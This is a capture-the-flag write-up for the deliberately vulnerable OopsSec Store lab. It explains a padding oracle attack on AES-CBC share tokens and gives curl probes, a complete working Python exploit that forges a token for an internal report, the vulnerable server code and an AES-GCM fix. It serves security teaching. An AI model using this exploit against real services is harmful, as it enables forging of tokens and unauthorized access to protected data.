---
author: kOaDT
authorGithubUrl: https://github.com/kOaDT
authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
pubDatetime: 2026-03-13T10:00:00Z
title: "Padding oracle attack: forging encrypted share tokens"
slug: aes-cbc-padding-oracle-forged-share-token
draft: false
tags:
  - writeup
  - cryptographic
  - padding-oracle
  - aes-cbc
  - ctf
description: A padding oracle in OopsSec Store's share feature leaks whether decryption produced valid PKCS#7 padding. That's enough to forge a token for an internal report and grab the flag.
---

OopsSec Store has a "Share Order" button that generates encrypted links. No login needed to open them. The tokens use AES-256-CBC, but nobody bothered adding an HMAC or using authenticated encryption. Worse, the server returns different status codes for "bad padding" and "resource not found". That's a textbook padding oracle, and we can abuse it to forge a token that decrypts to whatever plaintext we want.

## Table of contents

## Lab setup

From an empty directory:

```bash
npx create-oss-store oss-store
cd oss-store
npm start
```

Or with Docker (no Node.js required):

```bash
docker run -p 3000:3000 leogra/oss-oopssec-store
```

The app runs at `http://localhost:3000`.

## Target identification

After placing an order, the confirmation page shows a "Share Order" button. Clicking it generates a share URL:

```
http://localhost:3000/api/documents/share?token=a1b2c3d4...
```

The token is a hex string. Visit the URL and you get order details as JSON, no authentication required. It's 64 hex characters long, so 32 bytes: 16 bytes IV + 16 bytes ciphertext. A single AES block.

## Discovery: finding the oracle

Grab a valid token and start poking at it. Generate a share link from an order page, then extract the token.

### Confirming the token works

```bash
TOKEN="<your-token-here>"
curl -s "http://localhost:3000/api/documents/share?token=$TOKEN"
```

Response (200):

```json
{
  "type": "order",
  "order": {
    "id": "ORD-004",
    "total": 12.99,
    "status": "PENDING",
    ...
  }
}
```

### Flipping a byte in the ciphertext

Modify one hex character near the end of the token (in the ciphertext portion, bytes 17-32):

```bash
# Change the last hex digit
MODIFIED="${TOKEN:0:63}0"
curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/share?token=$MODIFIED"
```

Response: **400** — `{"error": "Invalid share token format"}`

Decryption failed. Bad padding.

### Flipping a byte in the IV

Now modify a hex character in the first 32 characters (the IV):

```bash
# Change the first hex digit
MODIFIED="0${TOKEN:1}"
curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/share?token=$MODIFIED"
```

Response: **404** — `{"error": "Shared resource not found"}`

Changing the IV doesn't break padding (padding depends on the ciphertext block), but it corrupts the decrypted plaintext. So the server got valid padding, tried to look up the garbled resource path, found nothing, and returned 404.

There's our oracle: **400 = bad padding, 404 = valid padding**.

## Understanding the vulnerability

### AES-CBC decryption

For a single-block ciphertext:

```
Plaintext = Decrypt(Key, CiphertextBlock) XOR IV
```

Decrypting the cipher block gives an "intermediate value". XOR that with the IV and you get the plaintext. The thing is, if we figure out the intermediate value, we can pick an IV that XORs it into whatever plaintext we want.

### PKCS#7 padding

The last block must have valid PKCS#7 padding. For a 13-byte plaintext like `order:ORD-001`:

```
o  r  d  e  r  :  O  R  D  -  0  0  1  03 03 03
```

The last 3 bytes are `\x03\x03\x03` (3 bytes of padding, each with value 3).

For a 15-byte plaintext like `report:internal`:

```
r  e  p  o  r  t  :  i  n  t  e  r  n  a  l  01
```

Just one byte of padding: `\x01`.

### The attack step by step

To recover `intermediate[15]` (the last intermediate byte):

1. Set a test IV where bytes 0-14 are anything and byte 15 is our guess `g`
2. Send `testIV + originalCipherBlock` to the server
3. The server computes `plaintext[15] = intermediate[15] XOR g`
4. If `plaintext[15] == 0x01`, padding is valid and the server returns 404 instead of 400
5. When we find the right `g`: `intermediate[15] = g XOR 0x01`

For byte 14, we want 2-byte padding (`\x02\x02`):

1. Set `testIV[15] = intermediate[15] XOR 0x02` (forces last byte to `\x02`)
2. Brute-force `testIV[14]` from 0 to 255
3. When padding is valid: `intermediate[14] = g XOR 0x02`

Repeat for all 16 bytes. Worst case: 256 x 16 = 4,096 requests for one block.

### Handling false positives

When attacking the last byte, a guess might produce valid padding like `\x02\x02` (if the second-to-last decrypted byte happens to be `\x02`) instead of the `\x01` we're looking for. Easy to check:

1. Flip byte 14 of the test IV
2. If the server now returns 400, the original result was a false positive (the padding was `\x02\x02`, not `\x01`)
3. Skip this guess and move on

## Exploitation

### Step 1: Generate a valid share token

Log in (e.g., as `alice@example.com` / `iloveduck`), place an order, and click "Share Order" on the confirmation page. Copy the token from the generated URL.

```bash
TOKEN="<your-64-char-hex-token>"
```

### Step 2: Confirm the oracle

```bash
# Original token — should return 200
curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/share?token=$TOKEN"

# Flip last ciphertext byte — should return 400 (bad padding)
FLIP_CT="${TOKEN:0:63}$(printf '%x' $(( (0x${TOKEN:63:1} + 1) % 16 )))"
curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/share?token=$FLIP_CT"

# Flip first IV byte — should return 404 (valid padding, wrong resource)
FLIP_IV="$(printf '%x' $(( (0x${TOKEN:0:1} + 1) % 16 )))${TOKEN:1}"
curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/share?token=$FLIP_IV"
```

### Step 3: Discover the target resource

Once you can decrypt your own token, you'll see the format is `order:<id>`. But what other resource types exist?

Forge a token with a garbage type (e.g., `aaaa:test`) and the server tells you:

```json
{
  "error": "Unsupported resource type 'aaaa'. Expected: order, report"
}
```

So `report` is a valid type. Try common identifiers: `report:internal`, `report:admin`, `report:secret`... The target is `report:internal`.

### Step 4: Run the padding oracle attack

Here's the full Python exploit:

```python
#!/usr/bin/env python3
"""Padding oracle exploit for OopsSec Store share tokens."""

import requests
import sys

BASE_URL = "http://localhost:3000"
BLOCK_SIZE = 16


def has_valid_padding(token_hex: str) -> bool:
    """Returns True if the server indicates valid padding (non-400 response)."""
    r = requests.get(f"{BASE_URL}/api/documents/share", params={"token": token_hex})
    return r.status_code != 400


def recover_intermediate(cipher_block: bytes) -> bytearray:
    """Recover the intermediate state of a cipher block using the padding oracle."""
    intermediate = bytearray(BLOCK_SIZE)

    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        padding_value = BLOCK_SIZE - byte_pos

        # Build test IV with known intermediate bytes set for target padding
        test_iv = bytearray(BLOCK_SIZE)
        for k in range(byte_pos + 1, BLOCK_SIZE):
            test_iv[k] = intermediate[k] ^ padding_value

        found = False
        for guess in range(256):
            test_iv[byte_pos] = guess
            token_hex = (bytes(test_iv) + cipher_block).hex()

            if has_valid_padding(token_hex):
                # Verify to avoid false positives on the last byte
                if byte_pos == BLOCK_SIZE - 1 and padding_value == 1:
                    verify_iv = bytearray(test_iv)
                    verify_iv[byte_pos - 1] ^= 1
                    verify_token = (bytes(verify_iv) + cipher_block).hex()
                    if not has_valid_padding(verify_token):
                        continue

                intermediate[byte_pos] = guess ^ padding_value
                plaintext_byte = intermediate[byte_pos] ^ 0  # XOR with 0 (test IV)
                print(
                    f"  [+] Byte {byte_pos:2d}: "
                    f"intermediate=0x{intermediate[byte_pos]:02x} "
                    f"(guess=0x{guess:02x}, padding=0x{padding_value:02x})"
                )
                found = True
                break

        if not found:
            print(f"  [-] Failed to find byte {byte_pos}")
            sys.exit(1)

    return intermediate


def forge_token(intermediate: bytearray, target: str, cipher_block: bytes) -> str:
    """Forge a new IV so the cipher block decrypts to the target plaintext."""
    target_bytes = target.encode("utf-8")
    pad_len = BLOCK_SIZE - len(target_bytes)
    if pad_len <= 0:
        print(f"[-] Target '{target}' must be shorter than {BLOCK_SIZE} bytes")
        sys.exit(1)

    padded = target_bytes + bytes([pad_len] * pad_len)
    new_iv = bytearray(BLOCK_SIZE)
    for i in range(BLOCK_SIZE):
        new_iv[i] = intermediate[i] ^ padded[i]

    return (bytes(new_iv) + cipher_block).hex()


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <share-token-hex>")
        print("  Get a token by clicking 'Share Order' on an order page")
        sys.exit(1)

    token_hex = sys.argv[1]
    token_bytes = bytes.fromhex(token_hex)

    if len(token_bytes) < 32:
        print("[-] Token too short. Expected at least 32 bytes (IV + 1 block)")
        sys.exit(1)

    iv = token_bytes[:16]
    cipher_block = token_bytes[16:32]

    print(f"[*] Token: {token_hex}")
    print(f"[*] IV:    {iv.hex()}")
    print(f"[*] Block: {cipher_block.hex()}")
    print()

    # Step 1: Recover intermediate state
    print("[*] Recovering intermediate state using padding oracle...")
    intermediate = recover_intermediate(cipher_block)
    print(f"\n[+] Intermediate: {intermediate.hex()}")

    # Verify by recovering the original plaintext
    original_plaintext = bytearray(BLOCK_SIZE)
    for i in range(BLOCK_SIZE):
        original_plaintext[i] = intermediate[i] ^ iv[i]
    print(f"[+] Original plaintext (raw): {bytes(original_plaintext)}")
    print()

    # Step 2: Forge token for 'report:internal'
    target = "report:internal"
    print(f"[*] Forging token for '{target}'...")
    forged_token = forge_token(intermediate, target, cipher_block)
    print(f"[+] Forged token: {forged_token}")
    print()

    # Step 3: Retrieve the flag
    print("[*] Sending forged token...")
    r = requests.get(
        f"{BASE_URL}/api/documents/share", params={"token": forged_token}
    )
    print(f"[*] Status: {r.status_code}")
    data = r.json()
    print(f"[*] Response: {data}")

    if "flag" in data:
        print(f"\n[+] FLAG: {data['flag']}")
    else:
        print("\n[-] No flag in response. Something went wrong.")


if __name__ == "__main__":
    main()
```

### Step 5: Run the exploit

```bash
python3 exploit.py <your-token-hex>
```

The script parses the token into IV and cipher block, brute-forces each byte of the intermediate state (up to 4,096 requests, a few seconds), forges a new IV so the block decrypts to `report:internal`, and sends the forged token.

> **Note:** If you already know the plaintext (e.g., `order:ORD-001`), you can compute the intermediate state directly as `intermediate[i] = iv[i] XOR plaintext_with_padding[i]` — no oracle queries needed. That's a useful shortcut for testing, but the real attack doesn't assume known plaintext: it recovers the intermediate state one byte at a time by brute-forcing each IV byte and observing the server's response (400 vs non-400).

### Step 6: Get the flag

The forged token decrypts to `report:internal`, and the share endpoint serves it up:

```json
{
  "type": "report",
  "title": "Internal Security Audit Report",
  "content": "Quarterly security assessment completed. All systems operational. No critical findings.",
  "flag": "OSS{p4dd1ng_0r4cl3_f0rg3d_t0k3n}"
}
```

## Vulnerable code analysis

Two things make this work.

First, no ciphertext authentication. Encrypt-only, no HMAC:

```typescript
export function encryptShareToken(plaintext: string): string {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", SHARE_KEY, iv);
  const encrypted = Buffer.concat([
    cipher.update(plaintext, "utf8"),
    cipher.final(),
  ]);
  return Buffer.concat([iv, encrypted]).toString("hex");
  // No HMAC computed over (IV + ciphertext)
}
```

Without an HMAC, the server can't tell if someone tampered with the ciphertext before trying to decrypt it. Every modified token hits the decryption logic.

Second, distinguishable error responses:

```typescript
try {
  resourcePath = decryptShareToken(token);
} catch {
  // Padding error → 400
  return NextResponse.json(
    { error: "Invalid share token format" },
    { status: 400 }
  );
}

// Valid padding → resource lookup → 404 if not found
```

The catch block handles the `decipher.final()` exception (thrown on invalid PKCS#7 padding) and returns 400. If decryption succeeds but the resource doesn't exist, the endpoint returns 404. That difference is all we need.

## Remediation

Switch from AES-CBC to AES-GCM:

```typescript
import crypto from "crypto";

const ALGORITHM = "aes-256-gcm";

export function encryptShareToken(plaintext: string): string {
  const iv = crypto.randomBytes(12); // GCM standard nonce size
  const cipher = crypto.createCipheriv(ALGORITHM, SHARE_KEY, iv);
  const encrypted = Buffer.concat([
    cipher.update(plaintext, "utf8"),
    cipher.final(),
  ]);
  const authTag = cipher.getAuthTag(); // 16-byte authentication tag
  return Buffer.concat([iv, authTag, encrypted]).toString("hex");
}

export function decryptShareToken(tokenHex: string): string {
  const data = Buffer.from(tokenHex, "hex");
  const iv = data.subarray(0, 12);
  const authTag = data.subarray(12, 28);
  const ciphertext = data.subarray(28);
  const decipher = crypto.createDecipheriv(ALGORITHM, SHARE_KEY, iv);
  decipher.setAuthTag(authTag);
  return Buffer.concat([
    decipher.update(ciphertext),
    decipher.final(),
  ]).toString("utf8");
}
```

With GCM, any modification to the IV, ciphertext, or auth tag causes `decipher.final()` to throw before producing any plaintext. No padding to leak, no oracle.

If you're stuck with CBC for some reason, use Encrypt-then-MAC: compute `HMAC-SHA256(key, IV || ciphertext)` after encryption, verify the HMAC before decryption, and return the same error regardless of what went wrong.
